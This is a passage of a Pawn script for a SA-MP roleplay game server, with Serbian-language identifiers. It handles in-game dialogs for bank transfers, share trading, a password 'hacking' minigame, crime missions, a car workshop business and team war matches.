            SendClientMessageEx( id, SIVA, "Primio si %d$ na svoj racun od %s", cashdeposit, ImeIgraca( playerid ), playerid );

            format( globalstring , sizeof( globalstring ), "|TRANSFER| %s > %s [ %d$ ]", ImeIgraca( playerid ), ImeIgraca( id ), cashdeposit );
            AdminPoruka( 0xFFC0CBAA, globalstring );
            UpdateBankTD( playerid ); UpdateBankTD( id );
            
            new string[ 128 ]; 
            format( string, sizeof( string ), "Igrac %s -> Igrac: %s | Novac: %d", ImeIgraca( playerid ), ImeIgraca( id ), cashdeposit );
            LogSave( "Ostalo/LogTransfer.log", string );

            updateBankState(playerid);

            return 1;
        }

        return 1;
    }

    if(dialogid == dialog_Deonice) {

        if(!response) return 0;
        if(response) {

            switch(listitem) {

                case 0: {

                    new str[256];

                    format( str, sizeof( str ),
                                "{31CC5A}Kupovna Cena: {FFFFFF}[%d]\n{31CC5A}Prodajna Cena: {FFFFFF}[%d]\n\n{31CC5A}Trenutno Posedujete: {FFFFFF}[%d]",
                                    deoniceKupovna,
                                    deoniceProdajna,
                                    PlayerInfo[playerid][xDeonice]);

                    ShowPlayerDialog( playerid, 0, DSMSG, ""col_crvena"Informacije", str, "U redu", "" );

                    return 1;
                }

                case 1: {

                    ShowPlayerDialog(playerid, dialog_DeoniceSell, DIALOG_STYLE_INPUT, "Prodaja Deonica", "Unesite kolicinu koju zelite da prodate", "Potvrdi", "Odustani");

                    return 1;
                }

                case 2: {

                    ShowPlayerDialog(playerid, dialog_DeoniceBuy, DIALOG_STYLE_INPUT, "Prodaja Deonica", "Unesite kolicinu koju zelite da kupite", "Potvrdi", "Odustani");

                    return 1;
                }
            }

            return 1;
        }

        return 1;
    }

    if(dialogid == dialog_DeoniceSell) {

        if(!response) return 0;
        if(response) {

            new kolicina = strval(inputtext);
            if(kolicina < 1 || kolicina > 100) return SendErrorMessage(playerid, "Ne mozes prodati manje od 1 ili vise od 100 odjednom!");

            if(PlayerInfo[playerid][xDeonice] < kolicina) return SendErrorMessage(playerid, "Ne posedujes toliko deonica!");

            new cena = kolicina * deoniceProdajna;

            PlayerInfo[playerid][xDeonice] -= kolicina;
            DajIgracuNovac(playerid, cena);
            SavePlayer(playerid);

            SendInfoMessage(playerid, "Uspesno si prodao %d deonica i zaradio %d$", kolicina, cena);

            new string1[ 128 ]; 
            format( string1, sizeof( string1 ), "Igrac %s je prodao %d deonica i zaradio %d$", ImeIgraca( playerid ), kolicina, cena);
            LogSave( "Ostalo/LogDeoniceSell.log", string1 );

            return 1;
        }
        return 1;
    }

    if(dialogid == dialog_DeoniceBuy) {

        if(!response) return 0;
        if(response) {

            new kolicina = strval(inputtext);
            if(kolicina < 1 || kolicina > 10) return SendErrorMessage(playerid, "Ne mozes kupiti manje od 1 ili vise od 10 odjednom!");

            new provera = kolicina + PlayerInfo[playerid][xDeonice];
            if(provera > 10) return SendErrorMessage(playerid, "Ne mozes da posedujes vise od 10 deonica odjednom!");

            new cena = kolicina * deoniceKupovna;
            if(GetPlayerMoney(playerid) < cena) return SendErrorMessage(playerid, "Nemas dovoljno novca! ($%d)", cena);

            PlayerInfo[playerid][xDeonice] += kolicina;
            DajIgracuNovac(playerid, -cena);
            SavePlayer(playerid);

            SendInfoMessage(playerid, "Uspesno si kupio %d deonica za %d$", kolicina, cena);

            if(PlayerInfo[playerid][xAchivements][12] == 0) {

                achivementPassed(playerid, 12, 6000);
            }

            new string1[ 128 ]; 
            format( string1, sizeof( string1 ), "Igrac %s je kupio %d deonica za %d$", ImeIgraca( playerid ), kolicina, cena);
            LogSave( "Ostalo/LogDeoniceBuy.log", string1 );

            return 1;
        }
        return 1;
    }

    if(dialogid == dialog_HackingSifra) {

        if(!response) return HackingTDControl(playerid, 0);
        if(response) {

            new uneto = strval(inputtext);
            if(uneto == playerHackingSifra[playerid]) {

                HackingTDControl(playerid, 0);

                playerHackingNosi[playerid] = true;

                Novi_SetPlayerCheckpoint(playerid, 583.7122,-1259.1456,17.9459, 2.0);

                SendInfoMessage(playerid, "Odnesi kodove ilegalnom brokeru!");

                return 1;
            }
            else {

                HackingTDControl(playerid, 0);

                SendInfoMessage(playerid, "Uneo si pogresnu sifru!");

                return 1;
            }
        }
    }

    // if(dialogid == dialog_Cipovanje) {

    //     if(!response) return spustiCipRampu();
    //     if(response) {

    //         new cip, cena;
    //         switch(listitem) {

    //             case 0: { cip = 1; cena = 50000; }
    //             case 1: { cip = 2; cena = 100000; }
    //             case 2: { cip = 3; cena = 150000; }
    //             case 3: { cip = 4; cena = 200000; }
    //         }

    //         new voziloID = ScriptIDVozila[GetPlayerVehicleID(playerid)];
    //         if(VehicleInfo[voziloID][vCipovanje] >= cip) { 
    //             SendErrorMessage(playerid, "Ovo vozilo vec ima taj stage! Trenutni stage ( %d )", VehicleInfo[voziloID][vCipovanje]);
    //             spustiCipRampu();
    //             return 1;
    //         }
    //         if(GetPlayerMoney(playerid) < cena) { 
    //             SendErrorMessage(playerid, "Nemas dovoljno novca ( %d$ )!", cena);
    //             spustiCipRampu();
    //             return 1;
    //         }

    //         DajIgracuNovac(playerid, -cena);

    //         VehicleInfo[voziloID][vCipovanje] = cip;
    //         SaveVehicle(voziloID);

    //         spustiCipRampu();

    //         SendInfoMessage(playerid, "Uspesno si kupio stage %d za %d$!", cip, cena);

    //         return 1;
    //     }
    // }

    if(dialogid == dialog_Misije && response) {

        switch(listitem) {

            case 0: {

                radiMisiju[playerid] = 1;
                misijaNosi[playerid] = true;
                misijaVraca[playerid] = false;

                misijaCounter[playerid] = 1;

                defer misijaCounterTimer(playerid);

                Novi_SetPlayerCheckpoint(playerid, 2103.9805,-1940.5629,13.5469, 3.0);

                SendInfoMessage(playerid, "Odnesi drogu na lokaciju! Potrudi se da stignes sto pre!");

                return 1;
            }

            case 1: {

                radiMisiju[playerid] = 2;
                misijaUbistvo[playerid] = 1;

                misijaCounter[playerid] = 1;

                GiveWeaponToPlayer(playerid, 34, 10);

                defer misijaCounterTimer(playerid);

                Novi_SetPlayerCheckpoint(playerid, 2462.4849,-1971.8231,21.7736, 3.0);

                SendInfoMessage(playerid, "Jedan policajac nam pravi problem! Resi ga se! Pozuri dok nije otisao!");

                return 1;
            }

            case 2: {

                radiMisiju[playerid] = 3;
                misijaKradja[playerid] = 1;

                GiveWeaponToPlayer(playerid, 23, 30);

                Novi_SetPlayerCheckpoint(playerid, 1510.0807,-1741.4623,6.2875, 3.0);

                SendInfoMessage(playerid, "Potrebno je da ukrades jedan laptop sa podatcima o prenosenju droge!");
                SendInfoMessage(playerid, "Evo ti pistolj u slucaju da neko cuva to mesto!");

                return 1;
            }
            case 3: {

                new meta = RandomNew(1, 19);

                paparazoMeta[playerid] = meta;
                radiPaparazo[playerid] = true;

                paparazoTimer = defer paparazoJobCooldown(playerid);

                SendPaparazoMessage(playerid, "Uspesno si zapoceo paparazo misiju!");
                SendPaparazoMessage(playerid, "Moras da odes na checkpoint i fotoaparatom slikati svoju metu!");
                SendPaparazoMessage(playerid, "Ako pridjes previse blizu, meta ce te provaliti!");
                SendPaparazoMessage(playerid, "Takodje, ne smes biti predaleko da bi slika bila dobra!");
                SendPaparazoMessage(playerid, "Da zaustavis misiju, koristi /zaustavipaparazo!");

                GiveWeaponToPlayer(playerid, 43, 10);
                EnablePlayerCameraTarget(playerid, 1);

                new Float:Poss[3];
                GetActorPos(paparazoTarget[meta], Poss[0], Poss[1], Poss[2]);

                Novi_SetPlayerCheckpoint(playerid, Poss[0], Poss[1], Poss[2], 3.0);

                return 1;
            }
        }

        return 1;
    }

    if(dialogid == dialog_WorkShop) {

        if(!response) return 0;
        if(response) {

            switch(listitem) {

                case 0: { //Info

                    new str[128];
                    new bigStr[2048];
                    new id = PlayerInfo[playerid][xWorkShopGarage];

                    format( str, sizeof( str ),
                                ""SRVBOJA1SCM"Broj Auta: {FFFFFF}[%d/2]\n"SRVBOJA1SCM"Broj Delova: {FFFFFF}[%d]\n"SRVBOJA1SCM"Broj Radnika: {FFFFFF}[%d/2]\n\n",
                                    WorkShopInfo[id][wBrojAuta],
                                    WorkShopInfo[id][wBrojDelova],
                                    WorkShopInfo[id][wBrojRadnika]);

                    strcat(bigStr, str);

                    switch(WorkShopInfo[id][wBrojAuta]) {

                        case 1: {

                            new popravka1[16];
                            if(WorkShopInfo[id][wPopravka1] >= 4) popravka1 = "Popravljen";
                            else popravka1 = "Pokvaren";

                            format( str, sizeof( str ),
                                "\n"SRVBOJA1SCM"Auto Broj: {FFFFFF}[1]\n"SRVBOJA1SCM"Model Auta: {FFFFFF}[%d]\n"SRVBOJA1SCM"Status Auta: {FFFFFF}[%s]\n",
                                    WorkShopInfo[id][wModel1],
                                    popravka1);

                            strcat(bigStr, str);
                        }
                        case 2: {

                            new popravka1[16];
                            if(WorkShopInfo[id][wPopravka1] >= 4) popravka1 = "Popravljen";
                            else popravka1 = "Pokvaren";

                            new popravka2[16];
                            if(WorkShopInfo[id][wPopravka2] >= 4) popravka2 = "Popravljen";
                            else popravka2 = "Pokvaren";

                            format( str, sizeof( str ),
                                "\n"SRVBOJA1SCM"Auto Broj: {FFFFFF}[1]\n"SRVBOJA1SCM"Model Auta: {FFFFFF}[%d]\n"SRVBOJA1SCM"Status Auta: {FFFFFF}[%s]\n",
                                    WorkShopInfo[id][wModel1],
                                    popravka1);

                            strcat(bigStr, str);

                            format( str, sizeof( str ),
                                "\n"SRVBOJA1SCM"Auto Broj: {FFFFFF}[2]\n"SRVBOJA1SCM"Model Auta: {FFFFFF}[%d]\n"SRVBOJA1SCM"Status Auta: {FFFFFF}[%s]\n",
                                    WorkShopInfo[id][wModel2],
                                    popravka2);

                            strcat(bigStr, str);
                        }
                    }

                    ShowPlayerDialog( playerid, 0, DSMSG, ""col_crvena"Informacije", bigStr, "U redu", "" );

                    return 1;
                }
                case 1: { //Kupi Auto

                    new id = PlayerInfo[playerid][xWorkShopGarage];

                    if(WorkShopInfo[id][wBrojAuta] >= 2) return SendErrorMessage(playerid, "Imas maksimalan broj auta!");

                    ShowPlayerDialog(playerid, dialog_WorkShopBuyCar, DIALOG_STYLE_LIST, "Kupovina Auta", "Turismo [350.000$]\nBravura [35.000$]\nStallion [60.000$]\nRegina [45.000$]\nComet [150.000$]\nSuper GT [200.000$]", "Kupi", "Odustani");

                    return 1;
                }
                case 2: { //Kupi Delove

                    Novi_SetPlayerCheckpoint( playerid, 2376.1082,-2017.1085,14.8329, 5.0 );
                    CheckpointStatus[ playerid ] = 15;
                    SCM( playerid, ZUTA, "Lokacija za kupovinu delova oznacena na mapi!" );

                    return 1;
                }
                case 3: { //Prodaja auta

                    new str[128];
                    new bigStr[2048];
                    new id = PlayerInfo[playerid][xWorkShopGarage];

                    if(WorkShopInfo[id][wBrojAuta] == 0) return SendErrorMessage(playerid, "Nemas nijedan auto!");

                    new popravka1[16];
                    if(WorkShopInfo[id][wPopravka1] >= 4) popravka1 = "Popravljen";
                    else popravka1 = "Pokvaren";

                    new popravka2[16];
                    if(WorkShopInfo[id][wPopravka2] >= 4) popravka2 = "Popravljen";
                    else popravka2 = "Pokvaren";

                    if(WorkShopInfo[id][wModel1] == 0) {

                        format(str, sizeof(str), ""SRVBOJA1SCM"Slot prazan\n");
                    } else {

                        format( str, sizeof( str ),
                            ""SRVBOJA1SCM"Model Auta: {FFFFFF}[%d] | "SRVBOJA1SCM"Status Auta: {FFFFFF}[%s]\n",
                                WorkShopInfo[id][wModel1],
                                popravka1);
                    }

                    strcat(bigStr, str);

                    if(WorkShopInfo[id][wModel2] == 0) {

                        format(str, sizeof(str), ""SRVBOJA1SCM"Slot prazan\n");
                    } else {

                        format( str, sizeof( str ),
                            ""SRVBOJA1SCM"Model Auta: {FFFFFF}[%d] | "SRVBOJA1SCM"Status Auta: {FFFFFF}[%s]\n",
                                WorkShopInfo[id][wModel2],
                                popravka2);
                    }

                    strcat(bigStr, str); 

                    ShowPlayerDialog( playerid, dialog_WorkShopSellCar, DIALOG_STYLE_LIST, ""col_crvena"Odaberi Auto za Prodaju", bigStr, "U redu", "" );

                    return 1;
                }
                case 4: { //Kupovina Radnika

                    if(WorkShopInfo[PlayerInfo[playerid][xWorkShopGarage]][wBrojRadnika] == 2) return SendErrorMessage(playerid, "Imas maksimalan broj radnika!");

                    ShowPlayerDialog(playerid, dialog_WorkShopBuyWork, DIALOG_STYLE_MSGBOX, ""SRVBOJA1SCM"Kupovina Radnika", "Da li ste sigurni da zelite da kupite novog radnika za 600.000$?", "Kupi", "Odustani");

                    return 1;
                }

                case 5: {

                    new str[128];
                    new price = RadionicaBuyPrice / 3;
                    format(str, sizeof(str), "Da li ste sigurni da zelite da prodate vasu radionicu za %d$?", price);
                    ShowPlayerDialog(playerid, dialog_WorkShopSell, DIALOG_STYLE_MSGBOX, ""SRVBOJA1SCM"Prodaja Drzavi", str, "Prodaj", "Odustani");

                    return 1;
                }
                case 6: {

                    if(ProdajeImovinu[playerid]) return SendErrorMessage(playerid, "Ne mozes to dok cekas odgovor od igraca na kupovinu!");
                    ShowPlayerDialog(playerid, dialog_RadionicaSellPlayer, DIALOG_STYLE_INPUT, "Radionica Prodaj Igracu", "Unesite : ID igraca i cenu\nPrimer : 14 1500000", "Ponudi", "Odustani");

                    return 1;
                }
            }
        }

        return 1;
    }

    if(dialogid == dialog_RadionicaSellPlayer && response) {

        new idw = PlayerInfo[playerid][xWorkShopGarage];
        if(idw == -1) return SendErrorMessage(playerid, "Ne posedujes Radionicu!");

        if(ProdajeImovinu[playerid]) return SendErrorMessage(playerid, "Ne mozes to dok cekas odgovor od igraca na kupovinu!");

        new cena, id;
        if(sscanf(inputtext, "ud", id, cena)) return ShowPlayerDialog(playerid, dialog_RadionicaSellPlayer, DIALOG_STYLE_INPUT, "Radionica Prodaj Igracu", "Unesite : ID igraca i cenu\nPrimer : 14 1500000", "Ponudi", "Odustani");
        if(!IsPlayerConnected(id)) return SendErrorMessage(playerid, "Pogresan ID!");
        if(PlayerInfo[id][xWorkShopGarage] != -1) return SendErrorMessage(playerid, "Igrac vec poseduje radionicu!");

        if(cena < 1 || cena > 99999999) return SendErrorMessage(playerid, "Cena ne moze biti manja od 1 ili veca od 99.999.999$!");

        ProdajeImovinu[playerid] = true;
        GlobalProdaja[id] = playerid;
        GlobalCena[id] = cena;
        new string[128];
        format(string, sizeof(string), "Igrac %s vam je ponudio svoju radionicu za %d$!", ImeIgraca(playerid), cena);

        ShowPlayerDialog(id, dialog_RadionicaSellPlayerAccept, DIALOG_STYLE_MSGBOX, "Kupi Radionicu", string, "Kupi", "Odustani");

        return 1;
    }

    if(dialogid == dialog_RadionicaSellPlayerAccept) {

        if(!response) {

            new player = GlobalProdaja[playerid];
            GlobalProdaja[playerid] = -1;
            GlobalCena[playerid] = 0;

            ProdajeImovinu[player] = false;
            SendInfoMessage(playerid, "Odustao si od kupovine!");
            SendInfoMessage(player, "Igrac %s je odustao od kupovine!", ImeIgraca(playerid));

            return 1;
        }

        if(response) {

            new id = GlobalProdaja[playerid];
            new cena = GlobalCena[playerid];

            if(!IsPlayerConnected(playerid)) return SendErrorMessage(id, "Pogresan ID!");
            if(PlayerInfo[playerid][xWorkShopGarage] != -1) return SendErrorMessage(id, "Igrac vec poseduje radionicu!");

            if(GetPlayerMoney(playerid) < GlobalCena[playerid]) {

                GlobalProdaja[playerid] = -1;
                GlobalCena[playerid] = 0;

                ProdajeImovinu[id] = false;
                SendInfoMessage(playerid, "Odustao si od kupovine zato sto nemas dovoljno novca!");
                SendInfoMessage(id, "Igrac %s je odustao od kupovine zato sto nema dovoljno novca!", ImeIgraca(playerid));

                return 1;
            }

            GlobalProdaja[playerid] = -1;
            GlobalCena[playerid] = 0;

            ProdajeImovinu[id] = false;

            new workshopID = PlayerInfo[id][xWorkShopGarage];

            strmid(WorkShopInfo[workshopID][wVlasnik], ImeIgraca(playerid),0,strlen(ImeIgraca(playerid)),255);
            SaveWorkShop(workshopID);
            WorkShopLabelUpdate(workshopID);

            PlayerInfo[playerid][xWorkShopGarage] = workshopID;
            SavePlayer(playerid);

            PlayerInfo[id][xWorkShopGarage] = -1;
            SavePlayer(id);

            DajIgracuNovac(id, cena);
            DajIgracuNovac(playerid, -cena);

            SendInfoMessage(id, "Prodao si svoju radionicu igracu %s za %d$", ImeIgraca(playerid), cena);
            SendInfoMessage(playerid, "Kupio si radionicu od igraca %s za %d$", ImeIgraca(id), cena);

            return 1;
        }

        return 1;
    }

    if(dialogid == dialog_WorkShopSell && response) {

        new id = PlayerInfo[playerid][xWorkShopGarage];
        if(id == -1) return SendErrorMessage(playerid, "Ne posedujes Radionicu!");

        if(ProdajeImovinu[playerid]) return SendErrorMessage(playerid, "Ne mozes to dok cekas odgovor od igraca na kupovinu!");

        WorkShopInfo[id][wBrojAuta] = 0;
        WorkShopInfo[id][wBrojDelova] = 0;

        WorkShopInfo[id][wModel1] = 0;
        WorkShopInfo[id][wModel2] = 0;
        WorkShopInfo[id][wPopravka1] = 0;
        WorkShopInfo[id][wPopravka2] = 0;

        WorkShopInfo[id][wBrojRadnika] = 0;

        strmid( WorkShopInfo[id][wVlasnik], "Niko", 0, strlen( "Niko" ), MAX_PLAYER_NAME );

        SaveWorkShop(id);

        WorkShopVehicleCheck(id);

        WorkShopLabelUpdate(id);
        
        new price = RadionicaBuyPrice / 3;
        DajIgracuNovac(playerid, price);
        PlayerInfo[playerid][xWorkShopGarage] = -1;
        SavePlayer(playerid);

        SendInfoMessage(playerid, "Uspesno si prodao WorkShop za %d$!", price);

        return 1;
    }

    if(dialogid == dialog_WorkShopBuyWork) {

        if(!response) return 0;
        if(response) {

            new id = PlayerInfo[playerid][xWorkShopGarage];

            if(WorkShopInfo[id][wBrojRadnika] == 2) return SendErrorMessage(playerid, "Imas maksimalan broj radnika!");
            if(GetPlayerMoney(playerid) < 600000) return SendErrorMessage(playerid, "Nemas dovoljno novca ( 600.000$ )!");

            DajIgracuNovac(playerid, -600000);
            WorkShopInfo[id][wBrojRadnika]++;
            SaveWorkShop(id);

            SendInfoMessage(playerid, "Uspesno si kupio radnika za WorkShop! Sada imas %d radnika!", WorkShopInfo[id][wBrojRadnika]);

            return 1;
        }
    }

    if(dialogid == dialog_WorkShopSellCarAccept) {

        if(!response) return 0;
        if(response) {

            new id = PlayerInfo[playerid][xWorkShopGarage];

            if(SelectedCar[playerid] == 1) {

                if(WorkShopInfo[id][wPopravka1] < 4) return SendErrorMessage(playerid, "Auto nije popravljen!");

                //Model 1
                DajIgracuNovac(playerid, WorkShopCarPrice[playerid]);

                WorkShopInfo[id][wBrojAuta]--;
                WorkShopInfo[id][wModel1] = 0;
                WorkShopInfo[id][wPopravka1] = 0;

                SaveWorkShop(id);

                WorkShopVehicleCheck(id);

                SendInfoMessage(playerid, "Uspesno si prodao vozilo i zaradio %d$!", WorkShopCarPrice[playerid]);

                return 1;
            }

            else if(SelectedCar[playerid] == 2) {

                if(WorkShopInfo[id][wPopravka2] < 4) return SendErrorMessage(playerid, "Auto nije popravljen!");

                DajIgracuNovac(playerid, WorkShopCarPrice[playerid]);

                WorkShopInfo[id][wBrojAuta]--;
                WorkShopInfo[id][wModel2] = 0;
                WorkShopInfo[id][wPopravka2] = 0;

                SaveWorkShop(id);

                WorkShopVehicleCheck(id);

                SendInfoMessage(playerid, "Uspesno si prodao vozilo i zaradio %d$!", WorkShopCarPrice[playerid]);

                return 1;
            }

            return 1;
        }
    }

    if(dialogid == dialog_WorkShopSellCar) {

        if(!response) return 0;
        if(response) {

            new id = PlayerInfo[playerid][xWorkShopGarage];

            switch(listitem) {

                case 0: {

                    if(WorkShopInfo[id][wModel1] == 0) return SendErrorMessage(playerid, "Desila se greska! Nemas vozilo na ovom slotu!");

                    SelectedCar[playerid] = 1;

                    new price = 0;

                    switch(WorkShopInfo[id][wModel1]) {

                        case 451: {price = 500000;}
                        case 401: {price = 140000;}
                        case 439: {price = 180000;}
                        case 479: {price = 160000;}
                        case 480: {price = 300000;}
                        case 506: {price = 450000;}
                    }

                    WorkShopCarPrice[playerid] = price;

                    new str[128];
                    format(str, sizeof(str), "Da li ste sigurni da zelite da prodate %s za %d$?", ImenaVozila[WorkShopInfo[id][wModel1] - 400], price);

                    ShowPlayerDialog(playerid, dialog_WorkShopSellCarAccept, DIALOG_STYLE_MSGBOX, "Potvrda Prodaje", str, "Prodaj", "Odustani");

                    return 1;
                }

                case 1: {

                    if(WorkShopInfo[id][wModel2] == 0) return SendErrorMessage(playerid, "Desila se greska! Nemas vozilo na ovom slotu!");

                    SelectedCar[playerid] = 2;

                    new price = 0;

                    switch(WorkShopInfo[id][wModel2]) {

                        case 451: {price = 500000;}
                        case 401: {price = 140000;}
                        case 439: {price = 180000;}
                        case 479: {price = 160000;}
                        case 480: {price = 300000;}
                        case 506: {price = 450000;}
                    }

                    WorkShopCarPrice[playerid] = price;

                    new str[128];
                    format(str, sizeof(str), "Da li ste sigurni da zelite da prodate %s za %d$?", ImenaVozila[WorkShopInfo[id][wModel2] - 400], price);

                    ShowPlayerDialog(playerid, dialog_WorkShopSellCarAccept, DIALOG_STYLE_MSGBOX, "Potvrda Prodaje", str, "Prodaj", "Odustani");

                    return 1;
                }
            }

            return 1;
        }

        return 1;
    }

    if(dialogid == dialog_WorkShopBuyCar) {

        if(!response) return 0;
        if(response) {

            new car;
            new id = PlayerInfo[playerid][xWorkShopGarage];
            switch(listitem) {

                case 0: {

                    if(GetPlayerMoney(playerid) < 350000) return SendErrorMessage(playerid, "Nemate dovoljno novca!");
                    car = 451;
                    WorkShopBuyPrice[playerid] = 350000;
                }
                case 1: {

                    if(GetPlayerMoney(playerid) < 35000) return SendErrorMessage(playerid, "Nemate dovoljno novca!");
                    car = 401;
                    WorkShopBuyPrice[playerid] = 35000;
                }
                case 2: {

                    if(GetPlayerMoney(playerid) < 60000) return SendErrorMessage(playerid, "Nemate dovoljno novca!");
                    car = 439;
                    WorkShopBuyPrice[playerid] = 60000;
                }
                case 3: {

                    if(GetPlayerMoney(playerid) < 45000) return SendErrorMessage(playerid, "Nemate dovoljno novca!");
                    car = 479;
                    WorkShopBuyPrice[playerid] = 45000;
                }
                case 4: {

                    if(GetPlayerMoney(playerid) < 150000) return SendErrorMessage(playerid, "Nemate dovoljno novca!");
                    car = 480;
                    WorkShopBuyPrice[playerid] = 150000;
                }
                case 5: {

                    if(GetPlayerMoney(playerid) < 200000) return SendErrorMessage(playerid, "Nemate dovoljno novca!");
                    car = 506;
                    WorkShopBuyPrice[playerid] = 200000;
                }
            }

            WorkShopBuyModel[playerid] = car;
            WorkShopBuyTow[playerid] = true;

            Novi_SetPlayerCheckpoint(playerid, WorkShopInfo[id][wPosX],WorkShopInfo[id][wPosY],WorkShopInfo[id][wPosZ], 3.0);

            SendInfoMessage(playerid, "Idite po svoj novi auto! Morate imati novac kod sebe!");

            return 1;

        }
        return 1;
    }

    if( dialogid == dialog_WAR && response ) {
        if( listitem == 0 ) { SPD( playerid, dialog_WAR_CREATE_1, DSL, "Odaberi Mapu", "Map 1 - Abandoned\nMap 2 - RC Battlefield\nMap 3 - Skladiste\nMap 4 - United\nMap 5 - Farm\nMap 6 - Urban", "Potvrdi", "Odustani"); }
        if( listitem == 1 ) { SPD( playerid, dialog_WARINVITE, DSI, "Pozovi Igraca", "ID Igraca", "Potvrdi", "Odustani" ); }
        if( listitem == 2 ) { SPD( playerid, dialog_WARUNINVITE, DSI, "Izbaci Igraca", "ID Igraca", "Potvrdi", "Odustani" ); }
        if( listitem == 3 ) { 

            if( WARPInfo[ playerid ][ warID ] == -1 ) return SendErrorMessage( playerid, "Nisi u War-u!" );



            return 1;
        }
    }
    else if( dialogid == dialog_WARUNINVITE && response ) {
        if( WARPInfo[ playerid ][ warID ] == -1 ) return SendErrorMessage( playerid, "Nisi u War-u" );
        new player, w = WARPInfo[ playerid ][ warID ];
        if( sscanf( inputtext, "u", player ) ) return SPD( playerid, dialog_WARUNINVITE, DSI, "Izbaci Igraca", "ID Igraca", "Potvrdi", "Odustani" );
        if( WARInfo[ w ][ warActive ] == false ) return SendErrorMessage( playerid, "War nije pokrenut");
        if( player == IPI ) return SPD( playerid, dialog_WARUNINVITE, DSI, "Izbaci Igraca", "ID Igraca", "Potvrdi", "Odustani" );
        if( WARPInfo[ player ][ warID ] == -1 ) return SPD( playerid, dialog_WARUNINVITE, DSI, "Izbaci Igraca", "ID Igraca", "Potvrdi", "Odustani" );
        WARPInfo[ player ][ warID ] = -1;
        SetPlayerHealth( player, 100 );

        SetPlayerPos( player, WARPInfo[ player ][ LastPosition ][ 0 ], WARPInfo[ player ][ LastPosition ][ 1 ],  WARPInfo[ player ][ LastPosition ][ 2 ] );
        SetPlayerVirtualWorld( player, WARPInfo[ player ][ LastVirtualWorld ] );
        SetPlayerInterior( player, WARPInfo[ player ][ LastInterior ] );
        ResetPlayerWeapons( player );

        ResetWarStatistics( player );
        if( WARPInfo[ playerid ][ warTeam ][ 0 ] == true ) { WARInfo[ w ][ warTeamMembers ][ 0 ]--; }
        if( WARPInfo[ playerid ][ warTeam ][ 1 ] == true ) { WARInfo[ w ][ warTeamMembers ][ 1 ]--; }

        SCM( playerid, -1, "Izbacio si clana." );

        WarTDControl( player, false );
    }
    else if( dialogid == dialog_WARINVITE && response ) {
        if( WARPInfo[ playerid ][ warID ] == -1 ) return SendErrorMessage( playerid, "Nisi u War-u" );
        new player, w = WARPInfo[ playerid ][ warID ];
        if( sscanf( inputtext, "u", player ) ) return SPD( playerid, dialog_WARINVITE, DSI, "Pozovi Igraca", "ID Igraca", "Potvrdi", "Odustani" );
        if( WARInfo[ w ][ warActive ] == false ) return SendErrorMessage( playerid, "War nije pokrenut");
        if( player == playerid ) return SPD( playerid, dialog_WARINVITE, DSI, "Pozovi Igraca", "ID Igraca", "Potvrdi", "Odustani" );
        if( player == IPI ) return SPD( playerid, dialog_WARINVITE, DSI, "Pozovi Igraca", "ID Igraca", "Potvrdi", "Odustani" );
        if( WARPInfo[ player ][ warID ] != -1 ) return SPD( playerid, dialog_WARINVITE, DSI, "Pozovi Igraca", "ID Igraca", "Potvrdi", "Odustani" );
        if( WARPInfo[ playerid ][ warTeam ][ 0 ] == true ) {
            if( WARInfo[ w ][ warTeamMembers ][ 0 ] >= WARInfo[ w ][ warMapMembers ] ) return SendErrorMessage(playerid, "Vec imas maksimum igraca u War-u");

            GetPlayerPos( player, WARPInfo[ player ][ LastPosition ][ 0 ], WARPInfo[ player ][ LastPosition ][ 1 ],  WARPInfo[ player ][ LastPosition ][ 2 ] );
            WARPInfo[ player ][ LastVirtualWorld ] = GetPlayerVirtualWorld( player );
            WARPInfo[ player ][ LastInterior ] = GetPlayerInterior( player );
            
            new rand1 = random( sizeof( warMap1Team1 ) );
            new rand21 = random( sizeof( warMap2Team1 ) );
            new rand31 = random( sizeof( warMap3Team1 ) );
            new rand41 = random( sizeof( warMap4Team1 ) );
            new rand51 = random( sizeof( warMap5Team1 ) );
            new rand61 = random( sizeof( warMap6Team1 ) );
            if( WARInfo[ w ][ warMap ] == 1 ) {
                SetPlayerPos( player, warMap1Team1[ rand1 ][ 0 ], warMap1Team1[ rand1 ][ 1 ],warMap1Team1[ rand1 ][ 2 ] );
                SetPlayerInterior( player, 0 );
            }
            else if( WARInfo[ w ][ warMap ] == 2 ) {
                SetPlayerPos( player, warMap2Team1[ rand21 ][ 0 ], warMap2Team1[ rand21 ][ 1 ],warMap2Team1[ rand21 ][ 2 ] );
                SetPlayerInterior( player, 10 );
            }
            else if( WARInfo[ w ][ warMap ] == 3 ) {
                SetPlayerPos( player, warMap3Team1[ rand31 ][ 0 ], warMap3Team1[ rand31 ][ 1 ],warMap3Team1[ rand31 ][ 2 ] );
                SetPlayerInterior( player, 0 );
            }
            else if( WARInfo[ w ][ warMap ] == 4 ) {
                SetPlayerPos( player, warMap4Team1[ rand41 ][ 0 ], warMap4Team1[ rand41 ][ 1 ],warMap4Team1[ rand41 ][ 2 ] );
                SetPlayerInterior( player, 0 );
            }
            else if( WARInfo[ w ][ warMap ] == 5 ) {
                SetPlayerPos( player, warMap5Team1[ rand51 ][ 0 ], warMap5Team1[ rand51 ][ 1 ],warMap5Team1[ rand51 ][ 2 ] );
                SetPlayerInterior( player, 0 );
            }

            else if( WARInfo[ w ][ warMap ] == 6 ) {
                SetPlayerPos( player, warMap6Team1[ rand61 ][ 0 ], warMap6Team1[ rand61 ][ 1 ],warMap6Team1[ rand61 ][ 2 ] );
                SetPlayerInterior( player, 0 );
            }



            GiveWeaponToPlayer( player, WARInfo[ w ][ warGuns ][ 0 ], 300 );
            GiveWeaponToPlayer( player, WARInfo[ w ][ warGuns ][ 1 ], 300 );
            GiveWeaponToPlayer( player, WARInfo[ w ][ warGuns ][ 2 ], 300 );
            GiveWeaponToPlayer( player, WARInfo[ w ][ warGuns ][ 3 ], 300 );
            SetPlayerVirtualWorld( player, w );
            SetPlayerHealth( player, 100 );

            WARInfo[ w ][ warTeamMembers ][ 0 ]++;

            ResetWarStatistics( player );
            WARPInfo[ player ][ warTeam ][ 0 ] = true;
            WARPInfo[ player ][ warID ] = w;
            format( globalstring, sizeof( globalstring ), ""COL_ORANGE"WAR "COL_WHITE"| "COL_ORANGE"Team 1: "COL_WHITE"%s "COL_WHITE"| "COL_ORANGE"Team 2: "COL_WHITE"%s", getOrgName( GetPlayerMember( WARInfo[ w ][ warTeamLeader ][ 0 ] ) ), getOrgName( GetPlayerMember( WARInfo[ w ][ warTeamLeader ][ 1 ] ) ) );
            SCM( player, -1, globalstring );
            SCM( player, -1, "War chat /wp." );
            SCM( playerid, -1,"Pozvao si igraca" );

            WarTDControl( player, true );
            SetWarStatsTD( w );
        }
        else if( WARPInfo[ playerid ][ warTeam ][ 1 ] == true ) {
